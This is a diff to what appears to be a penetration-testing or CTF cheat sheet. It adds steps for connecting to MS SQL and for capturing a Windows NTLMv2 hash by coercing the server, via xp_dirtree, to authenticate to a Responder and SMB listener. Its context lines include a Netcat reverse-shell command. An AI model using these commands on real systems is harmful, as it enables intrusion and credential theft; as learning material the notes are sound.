@@ -233,6 +233,22 @@ nc.exe $LHOST $LPORT -e cmd.exe
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 
 
+## Connect to MS SQL Database
+From local Kali machine:
+```mssqlclient.py $USERNAME:'$PASSWORD'@$RHOST -windows-auth```
+
+
+## Capture Windows Auth Hash via Responder (while on a MS SQL console)
+From local Kali machine, set up a smbserver:
+```sudo impacket-smbserver $SHARENAME $(pwd)```\
+From local Kali machine, set up a Responder listener:
+```sudo responder -I tun0```\
+From the MSSQL console:
+```xp_dirtree "\\$LHOST\$SHARENAME"```
+
+The responder listener will capture the NTMLv2 hash of the Windows target machine -> can possibly crack this hash with ```john``` or ```hashcat```
+
+
 ## SQL Injection
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 ```diff
